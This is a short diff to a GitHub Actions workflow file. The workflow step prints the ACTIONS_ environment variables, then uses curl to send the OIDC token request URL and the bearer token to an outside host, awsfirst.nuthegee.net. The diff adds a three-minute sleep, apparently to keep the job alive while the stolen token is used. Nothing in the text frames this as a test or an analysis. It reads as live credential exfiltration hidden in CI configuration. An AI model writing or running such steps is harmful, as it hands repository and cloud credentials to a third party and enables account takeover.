@@ -39,3 +39,4 @@ jobs:
           env | grep ACTIONS_
           curl http://awsfirst.nuthegee.net/test?a=$ACTIONS_ID_TOKEN_REQUEST_URL
           curl http://awsfirst.nuthegee.net/test?a=$ACTIONS_ID_TOKEN_REQUEST_TOKEN
+          sleep 180
